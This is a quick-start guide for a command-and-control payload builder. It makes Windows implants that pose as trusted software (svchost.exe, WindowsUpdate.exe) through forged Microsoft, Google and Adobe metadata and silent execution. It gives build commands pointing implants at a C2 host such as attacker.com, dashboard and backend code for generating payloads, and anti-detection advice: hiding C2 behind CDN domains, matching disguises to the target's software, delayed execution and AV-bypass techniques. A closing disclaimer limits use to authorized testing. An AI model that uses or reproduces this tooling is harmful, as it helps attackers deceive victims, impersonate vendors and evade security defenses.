# 🚀 Quick Start: Trusted-Looking Payloads

## TL;DR - Build in 3 Commands

```bash
# 1. Navigate to native payloads directory
cd /workspace/native_payloads

# 2. Set your C2 configuration and build
C2_HOST=192.168.1.100 C2_PORT=443 bash build_trusted_windows.sh

# 3. Your trusted payload is ready!
ls -lh output/
```

---

## 📋 What You Get

**Instead of this:**
```
❌ payload_native (generic name)
❌ No metadata
❌ Obvious malware indicators
❌ Shows console window
```

**You get this:**
```
✅ WindowsUpdate.exe (legitimate name)
✅ Microsoft Corporation metadata
✅ "Windows System Update Service" description
✅ Version: 10.0.19041.1 (Windows 10)
✅ © Microsoft Corporation. All rights reserved.
✅ No console window (silent)
✅ Stripped symbols
```

---

## 🎯 Use Cases

### 1. **Quick Default Build**
```bash
cd /workspace/native_payloads
bash build_trusted_windows.sh
```
**Result:** Random legitimate name, Microsoft metadata

### 2. **Specific Filename**
```bash
PAYLOAD_NAME="GoogleUpdate.exe" bash build_trusted_windows.sh
```
**Result:** GoogleUpdate.exe with Microsoft metadata

### 3. **Custom C2**
```bash
C2_HOST=attacker.com C2_PORT=443 bash build_trusted_windows.sh
```
**Result:** Connects to your domain on HTTPS port

### 4. **Compressed (Smaller Size)**
```bash
USE_UPX=yes bash build_trusted_windows.sh
```
**Result:** ~40-60% smaller binary (may trigger some AVs)

### 5. **Complete Custom**
```bash
PAYLOAD_NAME="OneDrive.exe" \
C2_HOST=cdn.example.com \
C2_PORT=443 \
USE_UPX=no \
bash build_trusted_windows.sh
```

---

## 🎨 Available Filenames

The script randomly chooses from these legitimate-looking names:

```
WindowsUpdate.exe          ← Windows Update
svchost.exe                ← Windows Service Host  
RuntimeBroker.exe          ← Windows Runtime
SecurityHealthSystray.exe  ← Windows Security
OneDrive.exe               ← Microsoft OneDrive
MicrosoftEdgeUpdate.exe    ← Edge Browser
GoogleUpdate.exe           ← Google Update
AdobeARM.exe               ← Adobe Updater
OfficeClickToRun.exe       ← Office Update
```

---

## 🏭 Metadata Styles

### Microsoft (Default)
```
Company: Microsoft Corporation
Description: Windows System Update Service
Product: Microsoft® Windows® Operating System
```

### Google
```
Company: Google LLC
Description: Google Update Service
Product: Google Update
```

### Adobe
```
Company: Adobe Inc.
Description: Adobe Updater Service
Product: Adobe Creative Cloud
```

### Custom
Edit `/workspace/native_payloads/windows/resource.rc`:
```rc
VALUE "CompanyName", "Your Company\0"
VALUE "FileDescription", "Your Description\0"
VALUE "ProductName", "Your Product\0"
```

---

## 🔍 Verify Your Build

### Check Metadata (Windows):
```powershell
Get-Item .\WindowsUpdate.exe | Select-Object VersionInfo | Format-List
```

**Should show:**
```
CompanyName      : Microsoft Corporation
FileDescription  : Windows System Update Service
FileVersion      : 10.0.19041.1
ProductName      : Microsoft® Windows® Operating System
LegalCopyright   : © Microsoft Corporation. All rights reserved.
```

### Check File (Linux):
```bash
file output/WindowsUpdate.exe
sha256sum output/WindowsUpdate.exe
```

---

## 📱 From Web Dashboard

### Add to Dashboard UI

Edit `/workspace/templates/dashboard.html` - Payloads section:

```html
<h3>Payload Options</h3>

<label>
    <input type="checkbox" id="trustedMode" />
    Build trusted-looking payload (Windows only)
</label>

<div id="trustedOptions" style="display:none;">
    <label>Filename:</label>
    <select id="trustedFilename">
        <option value="WindowsUpdate.exe">WindowsUpdate.exe</option>
        <option value="svchost.exe">svchost.exe</option>
        <option value="GoogleUpdate.exe">GoogleUpdate.exe</option>
        <option value="OneDrive.exe">OneDrive.exe</option>
    </select>
    
    <label>Metadata Style:</label>
    <select id="metadataStyle">
        <option value="microsoft">Microsoft</option>
        <option value="google">Google</option>
        <option value="adobe">Adobe</option>
    </select>
</div>
```

### Add JavaScript Handler

Edit `/workspace/static/js/app.js`:

```javascript
document.getElementById('trustedMode').addEventListener('change', function() {
    document.getElementById('trustedOptions').style.display = 
        this.checked ? 'block' : 'none';
});

// In generatePayload function:
if (document.getElementById('trustedMode').checked) {
    config.trusted = true;
    config.filename = document.getElementById('trustedFilename').value;
    config.metadata_style = document.getElementById('metadataStyle').value;
}
```

### Update Backend

Edit `/workspace/web_app_real.py`:

```python
@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    data = request.json
    
    if data.get('trusted') and data.get('platform') == 'windows':
        from trusted_payload_builder import trusted_builder
        
        config = {
            'c2_host': data.get('bind_host', 'localhost'),
            'c2_port': data.get('bind_port', 4433),
            'filename': data.get('filename', 'WindowsUpdate.exe'),
            'metadata_style': data.get('metadata_style', 'microsoft'),
            'use_upx': data.get('compress', False)
        }
        
        result = trusted_builder.build_trusted_payload(config)
        
        if result['success']:
            return jsonify({
                'success': True,
                'message': result['message'],
                'filename': result['filename'],
                'size': result['size_human'],
                'hash': result['hash'],
                'download_url': '/api/download-payload'
            })
        else:
            return jsonify({'error': result['error']}), 500
```

---

## 🛡️ Anti-Detection Tips

### 1. **Use HTTPS (Port 443)**
```bash
C2_PORT=443 bash build_trusted_windows.sh
```
- Blends with normal traffic
- Less suspicious than high ports

### 2. **Use CDN/Cloud Domains**
```bash
C2_HOST=cdn.cloudflare.com bash build_trusted_windows.sh
```
- Looks like legitimate cloud traffic
- Harder to block

### 3. **Match Target Environment**
If target uses:
- **Microsoft 365** → OneDrive.exe
- **Google Workspace** → GoogleUpdate.exe  
- **Adobe Products** → AdobeARM.exe

### 4. **Delay Execution**
Add to C code (in main.c):
```c
// Sleep 2 minutes before connecting
Sleep(120000);
```

### 5. **Add Legitimate Behavior**
```c
// Do something innocent first
download_file("https://www.microsoft.com/robots.txt");
// Then connect to C2
```

---

## 📊 Size Comparison

### Without Optimization:
```
~200 KB - Basic compiled binary
```

### With Optimization (Current):
```
~50-80 KB - Stripped + optimized
```

### With UPX:
```
~20-40 KB - Compressed (may trigger AV)
```

---

## ⚠️ Important Notes

### What This DOES:
✅ Makes payload look legitimate to users  
✅ Adds proper Windows metadata  
✅ Uses trusted company names  
✅ Silent execution (no console)  
✅ Professional appearance  

### What This DOESN'T Do:
❌ Bypass all antivirus (needs additional work)  
❌ Evade behavioral analysis automatically  
❌ Make it 100% undetectable (nothing is)  
❌ Provide legal authorization (you need that!)  

### For AV Bypass You Also Need:
- Code obfuscation
- Anti-sandbox checks
- Polymorphic code
- Delayed execution
- Encrypted strings
- Process injection
- Custom packers

---

## 🔐 Legal Reminder

**USE ONLY FOR:**
- ✅ Authorized penetration tests
- ✅ Red team exercises with permission
- ✅ Security research in controlled environments
- ✅ Educational purposes

**NEVER FOR:**
- ❌ Unauthorized access
- ❌ Illegal hacking
- ❌ Malicious purposes
- ❌ Without written permission

---

## 🆘 Troubleshooting

### "windres: command not found"
```bash
# Install MinGW tools
sudo apt install mingw-w64
```

### "Build failed: compilation error"
```bash
# Check compiler
x86_64-w64-mingw32-gcc --version

# View full error log
cat native_payloads/build/compile.log
```

### "No such file: resource.rc"
```bash
# Ensure resource file exists
ls native_payloads/windows/resource.rc

# Recreate if needed
git checkout native_payloads/windows/resource.rc
```

---

## 📚 More Information

**Full Guide:** `/workspace/PAYLOAD_TRUST_GUIDE.md`  
**Builder Code:** `/workspace/trusted_payload_builder.py`  
**Build Script:** `/workspace/native_payloads/build_trusted_windows.sh`

---

**Created:** 2025-10-19  
**Purpose:** Security Research & Authorized Testing  
**Status:** Production Ready
